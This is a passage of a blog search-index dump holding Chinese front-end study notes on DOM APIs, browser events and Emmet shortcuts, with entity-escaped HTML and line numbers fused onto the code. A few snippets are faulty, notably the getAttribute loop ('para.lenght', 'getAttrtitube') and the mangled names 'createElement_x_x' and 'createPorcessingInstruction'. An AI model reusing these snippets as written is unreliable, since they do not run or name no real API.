parentNode返回父节点(只读) Parsed 返回此节点及其子节点是否已经被解析(只读) Prefix 返回名称空间前缀(只读) preserveWhiteSpace 指定是否保留空白(可读写) previousSibling 返回此节点的前一个兄弟节点(只读) Text 返回此节点及其后代的文本内容(可读写) url返回最近载入的XML文档的URL(只读) Xml 返回节点及其后代的XML表示(只读) DOM方法小结 cloneNode 返回当前节点的拷贝 createAttribute 创建新的属性 节点操作DOMDocument属性和方法 createCDATASection 创建包括给定数据的CDATA段 createComment 创建一个注释节点 createDocumentFragment 创建DocumentFragment对象 createElement_x_x 创建一个元素节点 createEntityReference 创建EntityReference对象 createNode 创建给定类型,名字和命名空间的节点 createPorcessingInstruction 创建操作指令节点 createTextNode 创建包括给定数据的文本节点 getElementsByTagName返回指定名字的元素集合 hasChildNodes 返回当前节点是否有子节点 insertBefore在指定节点前插入子节点 Load导入指定位置的XML文档 loadXML 导入指定字符串的XML文档 removeChild 从子结点列表中删除指定的子节点 replaceChild从子节点列表中替换指定的子节点 Save 把XML`文件存到指定节点 selectNodes 对节点进行指定的匹配,并返回匹配节点列表 selectSingleNode 对节点进行指定的匹配,并返回第一个匹配节点 transformNode 使用指定的样式表对节点及其后代进行转换 transformNodeToObject 使用指定的样式表将节点及其后代转换为对象 document.documentElement返回文档的根节点 document.activeElement 返回当前文档中被击活的标签节点 event.fromElement 返回鼠标移出的源节点 event.toElement返回鼠标移入的源节点 event.srcElement 返回激活事件的源节点 node.parentNode,node.parentElement 返回父节点 node.childNodes 返回子节点集合（包含文本节点及标签节点） node.children 返回子标签节点集合 node.textNodes 返回子文本节点集合 node.firstChild返回第一个子节点 node.lastChild 返回最后一个子节点 node.nextSibling返回同属下一个节点 node.previousSibling 返回同属上一个节点 node.a(oNode) 追加子节点： node.applyElment(oNode,sWhere) sWhere有两个值：outside / inside 应用标签节点 node.insertBefore() node.insertAdjacentElement() node.replaceAdjacentText() 插入节点 node.remove() node.removeChild() node.removeNode() 删除节点 node.replaceChild() node.replaceNode() node.swapNode() 替换节点 node.cloneNode(bAll)返回复制复制节点引用 node.contains() 是否有子节点 node.hasChildNodes()是否有子节点 扩展阅读 DOM编程之API总结篇 第十五课时 上节回顾： 1.DOM 文档对象模型 document 功能 getElementById：通过传入的ID，返回标识了这个ID的唯一对象的内存地址 getElementsByTagName:通过传入的标签名字，返回所有该标签对象（HTMLCollection） getElementsByClassName:通过类的名字，返回所有该类的元素对象（HTMLCollection） createElement:想要创建出来的元素能够绘制在页面中，那么它必须在DOM树中 总结： document对象是DOM原型的核心对象，它是内存DOM树的根，所以它提供了很多功能让我们快速的找到DOM树中的某些DOM节点（对象） element 功能方法：（自定义属性非常灵活好用） setAttribute/getAttribute //getAttribute获取标签的属性 –用来操作标签的属性 setAttribute设置标签的属性 appendChild:添加子元素 属性： id className，style name,value(只有表单元素有 其他是没有的) href,src…(对应的元素) innerHTML/innerText innerText返回文本信息 children://子元素集合 parentNode//父元素 总结：元素的功能属性直接可以通过元素对象点出来，除此意外的自定义属性，请通过get/setAtribute去操作 新知识点： 1.事件（事故）基础 白话含义：就是当一个事物遇到某个事情的时候，要做的事情 （事件源） （事件监听名称） （事件处理程序） 2.常用事件 onclick:当事件源被点击的时候调用处理程序 onmouseover:鼠标进入事件 onmouseout:鼠标移出事件 onmousedown:鼠标按下去的时候 onmouseup:鼠标抬起来的时候 onscroll:当事件源滚动条滚动的时候 onkeydown:当键盘按下的时候 onkeypress:当键盘按下去的时候 onkeyup:当键盘弹上来的时候 onfocus:当事件源获得光标 onblur:当事件源失去光标 onchange:当事件源blur的时候内容改变了的话 浏览器事件注意事项： 1.以后我们不要把事件写在标签上,而使用js方式操作 2.js方式操作的话： 非IE浏览器第一个对象就会传入event事件源对象 IE浏览器第一个对象就不会传入event事件源对象（event = event||window.event;） 非IE浏览器的事件源属性是target属性（event.target = event.target||event.srcElement;） IE浏6览器的事件源属性是srcElement属性 3.事件冒泡机制 总结 以上是一些很基础的理论，笔记经验终究是别人的，看完了还是会忘记的，要转化成自己的东西，还要靠你不断实践。 JavaScript读书路线 JavaScript读书路线--from phodal js一些资料推荐 视频 Javascript第一季初级视频教程【李炎恢老师】 JavaScript视频教程 | 智能社 了解web开发知识体系 Growth - 陪你成为顶尖开发者 GitHub上收集整理的前端资源 常用组件 js常用组件整理 扩展阅读 廖雪峰JavaScript基础教程 JavaScript 闯关记 深入理解JavaScript系列 - 汤姆大叔 JavaScript秘密花园 附录一份大神总结的关于js的导图 DOM基本操作 javascript函数基础 JavaScript数据类型 window对象 javascript变量 JavaScript字符串函数 JavaScript正则表达式 JavaScript流程控制 JavaScript运算符 JavaScript数组 本文mardown原文件–欢迎转载","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"DOM编程之API学习总结篇","slug":"2016-09-DOM编程之API学习总结篇","date":"2016-09-22T09:10:43.000Z","updated":"2018-10-24T03:46:01.917Z","comments":true,"path":"note/4ac22b9d.html","link":"","permalink":"https://ru23.com/note/4ac22b9d.html","excerpt":"原文 链接 一、基本类型介绍 1.1 Node类型 DOM1级定义了一个Node接口，该接口由DOM中所有节点类型实现。这个Node接口在JS中是作为Node类型实现的。在IE9以下版本无法访问到这个类型，JS中所有节点都继承自Node类型，都共享着相同的基本属性和方法 Node有一个属性nodeType表示Node的类型，它是一个整数，其数值分别表示相应的Node类型","text":"原文 链接 一、基本类型介绍 1.1 Node类型 DOM1级定义了一个Node接口，该接口由DOM中所有节点类型实现。这个Node接口在JS中是作为Node类型实现的。在IE9以下版本无法访问到这个类型，JS中所有节点都继承自Node类型，都共享着相同的基本属性和方法 Node有一个属性nodeType表示Node的类型，它是一个整数，其数值分别表示相应的Node类型 假设我们要判断一个Node是不是元素，我们可以这样判断 123if(someNode.nodeType == 1)&#123;console.log(\"Node is a element\");&#125; 这些Node类型中，我们最常用的就是element，text，attribute，comment，document，document_fragment这几种类型 1.2 Element类型 Element提供了对元素标签名，子节点和特性的访问，我们常用HTML元素比如div，span，a等标签就是element中的一种。 Element有下面几条特性： nodeType为1 nodeName为元素标签名，tagName也是返回标签名 nodeValue为null parentNode可能是Document或Element 子节点可能是 Element，Text，Comment，Processing_Instruction，CDATASection 或 EntityReference 1.3 Text类型 Text表示文本节点，它包含的是纯文本内容，不能包含html代码，但可以包含转义后的html代码。Text有下面的特性： nodeType为3 nodeName为#text nodeValue为文本内容 parentNode是一个Element 没有子节点 1.4 Attr类型 Attr类型表示元素的特性，相当于元素的attributes属性中的节点，它有下面的特性： nodeType值为2 nodeName是特性的名称 nodeValue是特性的值 parentNode为null 1.5 Comment类型 Comment表示HTML文档中的注释，它有下面的几种特征： nodeType为8 nodeName为#comment nodeValue为注释的内容 parentNode可能是Document或Element 没有子节点 1.6 Document Document表示文档，在浏览器中，document对象是HTMLDocument的一个实例，表示整个页面，它同时也是window对象的一个属性。Document有下面的特性： nodeType为9 nodeName为#document nodeValue为 null parentNode为 null 子节点可能是一个DocumentType或Element 1.7 DocumentFragment类型 DocumentFragment是所有节点中唯一一个没有对应标记的类型，它表示一种轻量级的文档，可能当作一个临时的仓库用来保存可能会添加到文档中的节点。DocumentFragment有下面的特性： nodeType为11 nodeName为#document-fragment nodeValue为null parentNode为null 我们简单地介绍了几种常见的Node类型，要记住，HTML中的节点并不只是包括元素节点，它还包括文本节点，注释节点等等。在这里我们只是简单地说明了几种常见的节点. 二、 DOM提供的几个属性 2.1 childNodes属性 在一棵节点树上，childNodes属性可以用来获取任何一个元素的所有子节点，它是一个包含这个元素全部子元素的数组 1element.childNodes 2.2 nodeType属性 节点之间的关系构成了节点层次，html 页面的可以画出一个以html标签为根节点的树形结构DOM 会把文档看作是一棵树，同时定义了很多方法来操作这棵数中的每一个元素（节点） 12345678&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;hello world!!!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 每一个节点都有nodeType属性 1node.nodeType nodeType属性总共有12中可能取值，但其中仅有3种有实用价值 元素节点的nodeType属性值是1 属性节点的nodeType属性值是2 文本节点的nodeType属性值是3 1description.firstChild.nodeValue = text; 2.3 nodeValue属性 nodeValue属性 如果想改变一个文本节点的值，那就使用DOM提供的nodeValue,它用来得到一个节点的值 node.nodeValue 需要注意：nodeValue属性获取对象的值时，得到的并不是包含在这个段落里的文本 nodeValue属性不仅可以用来检测节点的值，还可以设置节点的值 2.4 firstChild和lastChild属性 数组元素childNodes[0]有个更直观的同义词。无论如何，只要访问childNodes数组的第一个元素，都可以把它写成firstChild 1node.firstChild 与下面等价 1node.childNodes[0] DOM还提供了一个与之对应的lastChild属性 1node.lastChild 三、节点创建型API 在这里，我将常用的DOM操作api进行分类，首先要介绍的是创建型的api。这一类型的api，简而言之就是用来创建节点的 3.1 createElement createElement通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：IE8以下浏览器不支持自定义标签 12var div = document.createElement(\"div\"); 使用createElement要注意：通过createElement创建的元素并不属于html文档，它只是创建出来，并未添加到html文档中，要调用appendChild或insertBefore等方法将其添加到HTML文档树中 3.2 createTextNode createTextNode用来创建一个文本节点，用法如下 12var textNode = document.createTextNode(\"一个TextNode\"); createTextNode接收一个参数，这个参数就是文本节点中的文本，和createElement一样，创建后的文本节点也只是独立的一个节点，同样需要appendChild将其添加到HTML文档树中 3.3 cloneNode cloneNode是用来返回调用方法的节点的一个副本，它接收一个bool参数，用来表示是否复制子元素，使用如下： 123var parent = document.getElementById(\"parentElement\"); var parent2 = parent.cloneNode(true);// 传入trueparent2.id = \"parent2\"; 这段代码通过cloneNode复制了一份parent元素，其中cloneNode的参数为true，表示parent的子节点也被复制，如果传入false，则表示只复制了parent节点 123456789101112131415&lt;div id=\"parent\"&gt; 我是父元素的文本 &lt;br/&gt; &lt;span&gt; 我是子元素 &lt;/span&gt;&lt;/div&gt;&lt;button id=\"btnCopy\"&gt;复制&lt;/button&gt;var parent = document.getElementById(\"parent\");document.getElementById(\"btnCopy\").onclick = function()&#123; var parent2 = parent.cloneNode(true); parent2.id = \"parent2\"; document.body.appendChild(parent2);&#125; 这段代码很简单，主要是绑定button事件，事件内容是复制了一个parent，修改其id，然后添加到文档中 这里有几点要注意： 和createElement一样，cloneNode创建的节点只是游离有html文档外的节点，要调用appendChild方法才能添加到文档树中 如果复制的元素有id，则其副本同样会包含该id，由于id具有唯一性，所以在复制节点后必须要修改其id 调用接收的bool参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同 除此之外，我们还有一个需要注意的点： 如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论： 如果是通过addEventListener或者比如onclick进行绑定事件，则副本节点不会绑定该事件 如果是内联方式绑定比如 12&lt;div onclick=\"showParent()\"&gt;&lt;/div&gt; 这样的话，副本节点同样会触发事件 3.4 createDocumentFragment createDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中 createDocumentFragment方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中 1234567891011&lt;ul id=\"list\"&gt;&lt;/ul&gt;&lt;input type=\"button\" value=\"添加多项\" id=\"btnAdd\" /&gt;document.getElementById(\"btnAdd\").onclick = function()&#123; var list = document.getElementById(\"list\"); for(var i = 0;i &lt; 100; i++)&#123; var li = document.createElement(\"li\"); li.textContent = i; list.appendChild(li); &#125;&#125; 这段代码将按钮绑定了一个事件，这个事件创建了100个li节点，然后依次将其添加HTML文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用createDocumentFragment了 DocumentFragment不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下 123456789101112document.getElementById(\"btnAdd\").onclick = function()&#123; var list = document.getElementById(\"list\"); var fragment = document.createDocumentFragment(); for(var i = 0;i &lt; 100; i++)&#123; var li = document.createElement(\"li\"); li.textContent = i; fragment.appendChild(li); &#125; list.appendChild(fragment);&#125; 优化后的代码主要是创建了一个fragment，每次生成的li节点先添加到fragment，最后一次性添加到list 3.5 创建型API总结 创建型api主要包括createElement，createTextNode，cloneNode和createDocumentFragment四个方法，需要注意下面几点： 它们创建的节点只是一个孤立的节点，要通过appendChild添加到文档中 cloneNode要注意如果被复制的节点是否包含子节点以及事件绑定等问题 使用createDocumentFragment来解决添加大量节点时的性能问题 四、页面修改型API 前面我们提到创建型api，它们只是创建节点，并没有真正修改到页面内容，而是要调用appendChild来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。修改页面内容的api主要包括：appendChild，insertBefore，removeChild，replaceChild 4.1 appendChild appendChild我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下： 1parent.appendChild(child); child节点将会作为parent节点的最后一个子节点 appendChild这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方 123456789101112131415&lt;div id=\"child\"&gt; 要被添加的节点&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;div id=\"parent\"&gt; 要移动的位置&lt;/div&gt; &lt;input id=\"btnMove\" type=\"button\" value=\"移动节点\" /&gt;document.getElementById(\"btnMove\").onclick = function()&#123; var child = document.getElementById(\"child\"); document.getElementById(\"parent\").appendChild(child);&#125; 这段代码主要是获取页面上的child节点，然后添加到指定位置，可以看到原本的child节点被移动到parent中了。这里还有一个要注意的点：如果child绑定了事件，被移动时，它依然绑定着该事件 4.2 insertBefore insertBefore用来添加一个节点到一个参照节点之前，用法如下 12parentNode.insertBefore(newNode,refNode); parentNode表示新节点被添加后的父节点 newNode表示要添加的节点 refNode表示参照节点，新节点会添加到这个节点之前 123456789101112131415&lt;div id=\"parent\"&gt; 父节点 &lt;div id=\"child\"&gt; 子元素 &lt;/div&gt;&lt;/div&gt;&lt;input type=\"button\" id=\"insertNode\" value=\"插入节点\" /&gt;var parent = document.getElementById(\"parent\");var child = document.getElementById(\"child\");document.getElementById(\"insertNode\").onclick = function()&#123; var newNode = document.createElement(\"div\"); newNode.textContent = \"新节点\" parent.insertBefore(newNode,child);&#125; 这段代码创建了一个新节点，然后添加到child节点之前 和appendChild一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。 关于第二个参数参照节点还有几个注意的地方： refNode是必传的，如果不传该参数会报错 如果refNode是undefined或null，则insertBefore会将节点添加到子元素的末尾 4.3 removeChild removeChild顾名思义，就是删除指定的子节点并返回，用法如下 12var deletedChild = parent.removeChild(node); deletedChild指向被删除节点的引用，它等于node，被删除的节点仍然存在于内存中，可以对其进行下一步操作。 注意：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除： 123if(node.parentNode)&#123; node.parentNode.removeChild(node);&#125; 通过节点自己获取节点的父节点，然后将自身删除 4.4 replaceChild replaceChild用于使用一个节点替换另一个节点，用法如下 12parent.replaceChild(newChild,oldChild); newChild是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置 oldChild是被替换的节点 4.5 页面修改型API总结 页面修改型api主要是这四个接口，要注意几个特点： 不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置 节点本身绑定的事件会不会消失，会一直保留着 五、节点查询型API 节点查询型API也是非常常用的 5.1 document.getElementById 这个接口很简单，根据元素id返回元素，返回值是Element类型，如果不存在该元素，则返回null 使用这个接口有几点要注意： 元素的Id是大小写敏感的，一定要写对元素的id HTML文档中可能存在多个id相同的元素，则返回第一个元素 只从文档中进行搜索元素，如果创建了一个元素并指定id，但并没有添加到文档中，则这个元素是不会被查找到的 5.2 document.getElementsByTagName 这个接口根据元素标签名获取元素，返回一个即时的HTMLCollection类型，什么是即时的HTMLCollection类型呢？ 12345678910111213141516&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt; &lt;input type=\"button\" value=\"显示数量\" id=\"btnShowCount\"/&gt;&lt;input type=\"button\" value=\"新增div\" id=\"btnAddDiv\"/&gt; var divList = document.getElementsByTagName(\"div\");document.getElementById(\"btnAddDiv\").onclick = function()&#123; var div = document.createElement(\"div\"); div.textContent =\"div\" + (divList.length+1); document.body.appendChild(div);&#125; document.getElementById(\"btnShowCount\").onclick = function()&#123; alert(divList.length);&#125; 这段代码中有两个按钮，一个按钮是显示HTMLCollection元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到HTMLCollcetion元素是即时的表示该集合是随时变化的，也就是是文档中有几个div，它会随时进行变化，当我们新增一个div后，再访问HTMLCollection时，就会包含这个新增的div 使用document.getElementsByTagName这个方法有几点要注意： 如果要对HTMLCollection集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率 如果没有存在指定的标签，该接口返回的不是null，而是一个空的HTMLCollection “*”表示所有标签 5.3 document.getElementsByName getElementsByName主要是通过指定的name属性来获取元素，它返回一个即时的NodeList对象。一般用于获取表单元素的·name·属性 使用这个接口主要要注意几点： 返回对象是一个即时的NodeList，它是随时变化的 在HTML元素中，并不是所有元素都有name属性，比如div是没有name属性的，但是如果强制设置div的name`属性，它也是可以被查找到的 在IE中，如果id设置成某个值，然后传入getElementsByName的参数值和id值一样，则这个元素是会被找到的，所以最好不好设置同样的值给id和name 5.4 document.getElementsByClassName 这个API是根据元素的class返回一个即时的HTMLCollection，用法如下 1var elements = document.getElementsByClassName(names); 这个接口有下面几点要注意： 返回结果是一个即时的HTMLCollection，会随时根据文档结构变化 IE9以下浏览器不支持 如果要获取2个以上classname，可传入多个classname，每个用空格相隔，例如 12var elements = document.getElementsByClassName(\"test1 test2\"); 5.5 document.querySelector和document.querySelectorAll 这两个api很相似，通过css选择器来查找元素，注意选择器要符合CSS选择器的规则 首先来介绍一下document.querySelector document.querySelector返回第一个匹配的元素，如果没有匹配的元素，则返回null。 注意，由于返回的是第一个匹配的元素，这个api使用的深度优先搜索来获取元素 1234567891011121314&lt;div&gt; &lt;div&gt; &lt;span class=\"test\"&gt;第三级的span&lt;/span&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class=\"test\"&gt; 同级的第二个div&lt;/div&gt;&lt;input type=\"button\" id=\"btnGet\" value=\"获取test元素\" /&gt;document.getElementById(\"btnGet\").addEventListener(\"click\",function()&#123; var element = document.querySelector(\".test\"); alert(element.textContent);&#125;) 这个例子很简单，就是两个class都包含“test”的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过querySelector获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素 document.querySelectorAll的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符 1234567891011121314&lt;div class=\"test\"&gt; class为test&lt;/div&gt;&lt;div id=\"test\"&gt; id为test&lt;/div&gt;&lt;input id=\"btnShow\" type=\"button\" value=\"显示内容\" /&gt;document.getElementById(\"btnShow\").addEventListener(\"click\",function()&#123; var elements = document.querySelectorAll(\"#test,.test\"); for(var i = 0,length = elements.length;i&lt;length;i++)&#123; alert(elements[i].textContent); &#125; &#125;) 这段代码通过querySelectorAll，使用id选择器和class选择器选择了两个元素，并依次输出其内容。要注意两点： querySelectorAll也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关 返回的是一个非即时的NodeList，也就是说结果不会随着文档树的变化而变化 兼容性问题：querySelector和querySelectorAll在ie8以下的浏览器不支持 小结： document.getElementById返回一个对象 document.getElementsByName和document.getElementsByClasName返回一个对象数组 六、节点关系型API 在html文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等 6.1 父关系型API parentNode：每个节点都有一个parentNode属性，它表示元素的父节点。Element的父节点可能是Element，Document或DocumentFragment parentElement：返回元素的父元素节点，与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null 6.2 兄弟关系型API previousSibling：节点的前一个节点，如果该节点是第一个节点，则为null。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下 previousElementSibling：返回前一个元素节点，前一个节点必须是Element，注意IE9以下浏览器不支持 nextSibling previousSibling 存在兼容性问题 nextElementSibling previousElementSibling 推荐使用 12345678910&lt;script&gt; var oUl = document.getElementById('ul1'); var firstEle = oUl.firstElementChild; var lastEle = oUl.lastElementChild; firstEle.nextElementSibling.style.background = 'red'; lastEle.previousElementSibling.style.background = 'green';&lt;/script&gt; nextSibling：节点的后一个节点，如果该节点是最后一个节点，则为null。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下 nextElementSibling：返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持 6.3 子关系型API childNodes： 返回一个即时的NodeList，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。childNodes子节点列表集合（只读属性 有兼容性问题 ） 12345678910&lt;ul id=\"ul1\"&gt; &lt;li&gt;11111&lt;/li&gt; &lt;li&gt;22222&lt;/li&gt; &lt;li&gt;3333&lt;/li&gt; &lt;li&gt;44444&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; var oUl = document.getElementById('ul1'); console.log(oUl.childNodes);&lt;/script&gt; 从截图中可以看出 这段代码中ul的子节点有9个，这说明使用childNodes获取的节点包括了文本节点和元素节点 childNodes 在低版本的ie 浏览器下获取的节点只包括元素节点，这就导致了兼容性问题 如何解决兼容性？？ 根据子节点的nodeType属性值判断 1234567for (var i=0; i&lt;oUl.childNodes.length; i++) &#123; if ( oUl.childNodes[i].nodeType == 1 ) &#123; oUl.childNodes[i].style.background = 'red'; &#125; &#125; children： 一个即时的HTMLCollection，子节点都是Element，IE9以下浏览器不支持。children子节点列表集合（只读属性 推荐使用 ） children 获取的子节点只包含元素节点 123for (var i = 0; i&lt;oUl.children.length; i++)&#123; oUl.children[i].style.background = 'red';&#125; firstNode：第一个子节点 lastNode：最后一个子节点 firstChild （firstElementChild） lastChild(lastElementChild) 第一个子节点 最后一个子节点 firstChild 、lastChild 和childNodes同样的存在兼容性问题，在低版本ie浏览器中只能获取到元素节点 firstElementChild、 lastElementChild 获取第一个元素子节点，最后一个元素子节点 推荐使用 1234567var oUl = document.getElementById('ul1');// oUl.firstChild.style.background = 'red';//标准浏览器 报错// oUl.lastChild.style.background = 'red';//标准浏览器 报错oUl.firstElementChild.style.background = 'red';oUl.lastElementChild.style.background = 'red'; hasChildNodes方法：可以用来判断是否包含子节点 七、元素属性型 7.1 setAttribute setAttribute：它允许我们对元素属性值做出修改与getAttribute一样setAttribute也能用于元素节点 通过setAttribute对文档做出修改后，在通过浏览器的查看源码选项看到的任然是改变之前的属性值，也就是说setAttribue做出的修改，不会反应到文档本身的源码里 setAttribute优势在于可以修改文档中的任何一个属性 12element.setAttribute(name, value); 其中name是特性名，value是特性值。如果元素不包含该特性，则会创建该特性并赋值。 如果元素本身包含指定的特性名为属性，则可以访问属性进行赋值，比如下面两条代码是等价 1234element.setAttribute(\"id\",\"test\");element.id = \"test\"; 非DOM的解决方案 其实不用setAttribute也可以改变元素的属性 setAttribute方法是第一级DOM的组成部分，它可以设计任何元素节点的任意属性。在第1级DOM出现之前，你可以通过另外一种办法设置大部分元素的属性 1element.value = \"the new value\"; 与下面语句等价 1element.setAttribute(\"value\",\"the new value\"); 7.2 getAttribute getAttribute返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。 getAttribute不属性doucment对象，不能通过document对象调用，只能通过元素节点对象调用 例如可以与getElementsByTagName方法合用，获取每个p的title属性 1234var paras = document.getElementsByTagName(\"p\");for(var i=0;i&lt;para.lenght;i++)&#123; alert(paras.getAttrtitube(\"title\"));&#125; 八、表格操作 九、样式操作 十、大小和偏移 十一、网上的一张思维导图总结 参考 JavaScript DOM编程艺术 常用DOM操作 本文mardown原文件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"DOM","slug":"DOM","permalink":"https://ru23.com/tags/DOM/"}]},{"title":"Emmet常用快捷键","slug":"2016-09-Emmet常用快捷键","date":"2016-09-09T13:00:08.000Z","updated":"2018-10-24T03:46:01.919Z","comments":true,"path":"note/52877228.html","link":"","permalink":"https://ru23.com/note/52877228.html","excerpt":"基本语法 div+div&gt;p&gt;span+em^bq","text":"基本语法 div+div&gt;p&gt;span+em^bq 12345&lt;div&gt;&lt;/div&gt;&lt;div&gt; &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt; &lt;blockquote&gt;&lt;/blockquote&gt;&lt;/div&gt; div+div&gt;p&gt;span+em^^bq 12345&lt;div&gt;&lt;/div&gt;&lt;div&gt; &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;&lt;/div&gt;&lt;blockquote&gt;&lt;/blockquote&gt; div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p 1234567891011&lt;div&gt; &lt;header&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/header&gt; &lt;footer&gt; &lt;p&gt;&lt;/p&gt; &lt;/footer&gt;&lt;/div&gt; (div&gt;dl&gt;(dt+dd)*3)+footer&gt;p 12345678910111213&lt;div&gt; &lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;/dl&gt;&lt;/div&gt;&lt;footer&gt; &lt;p&gt;&lt;/p&gt;&lt;/footer&gt; ul&gt;li.item$*5 1234567&lt;ul&gt; &lt;li class=\"item1\"&gt;&lt;/li&gt; &lt;li class=\"item2\"&gt;&lt;/li&gt; &lt;li class=\"item3\"&gt;&lt;/li&gt; &lt;li class=\"item4\"&gt;&lt;/li&gt; &lt;li class=\"item5\"&gt;&lt;/li&gt;&lt;/ul&gt; h$[title=item$]{Header $}*3 123&lt;h1 title=\"item1\"&gt;Header 1&lt;/h1&gt;&lt;h2 title=\"item2\"&gt;Header 2&lt;/h2&gt;&lt;h3 title=\"item3\"&gt;Header 3&lt;/h3&gt; ul&gt;li.item$$$*5 1234567&lt;ul&gt; &lt;li class=\"item001\"&gt;&lt;/li&gt; &lt;li class=\"item002\"&gt;&lt;/li&gt; &lt;li class=\"item003\"&gt;&lt;/li&gt; &lt;li class=\"item004\"&gt;&lt;/li&gt; &lt;li class=\"item005\"&gt;&lt;/li&gt;&lt;/ul&gt; ul&gt;li.item$@-*5 1234567&lt;ul&gt; &lt;li class=\"item5\"&gt;&lt;/li&gt; &lt;li class=\"item4\"&gt;&lt;/li&gt; &lt;li class=\"item3\"&gt;&lt;/li&gt; &lt;li class=\"item2\"&gt;&lt;/li&gt; &lt;li class=\"item1\"&gt;&lt;/li&gt;&lt;/ul&gt; ul&gt;li.item$@3*5 1234567&lt;ul&gt; &lt;li class=\"item3\"&gt;&lt;/li&gt; &lt;li class=\"item4\"&gt;&lt;/li&gt; &lt;li class=\"item5\"&gt;&lt;/li&gt; &lt;li class=\"item6\"&gt;&lt;/li&gt; &lt;li class=\"item7\"&gt;&lt;/li&gt;&lt;/ul&gt; form#search.wide 1&lt;form id=\"search\" class=\"wide\"&gt;&lt;/form&gt; p.class1.class2.class3 1&lt;p class=\"class1 class2 class3\"&gt;&lt;/p&gt; td[rowspan=2 colspan=3 title] 1&lt;td rowspan=\"2\" colspan=\"3\" title=\"\"&gt;&lt;/td&gt; HTML ! 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; a:link 1&lt;a href=\"http://\"&gt;&lt;/a&gt; a:mail 1&lt;a href=\"mailto:\"&gt;&lt;/a&gt; link:css 1&lt;link rel=\"stylesheet\" href=\"style.css\" /&gt; link:favicon 1&lt;link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"favicon.ico\" /&gt; link:rss 1&lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"RSS\" href=\"rss.xml\" /&gt; meta:utf 1&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\" /&gt; script:src 1&lt;script src=\"\"&gt;&lt;/script&gt; form:get 1&lt;form action=\"\" method=\"get\"&gt;&lt;/form&gt; input:hidden,input:h 1&lt;input type=\"hidden\" name=\"\" /&gt; input:text, input:t input:password, input:p input:checkbox, input:c input:radio,input:r input:file, input:f input:submit, input:s input:image,input:i input:button, input:b option, opt 1&lt;option value=\"\"&gt;&lt;/option&gt; button:disabled,button:d, btn:d 1&lt;button disabled=\"disabled\"&gt;&lt;/button&gt; ifr 1&lt;iframe src=\"\" frameborder=\"0\"&gt;&lt;/iframe&gt; btn 1&lt;button&gt;&lt;/button&gt; ul+ 123&lt;ul&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt; dl+ 12345&lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; 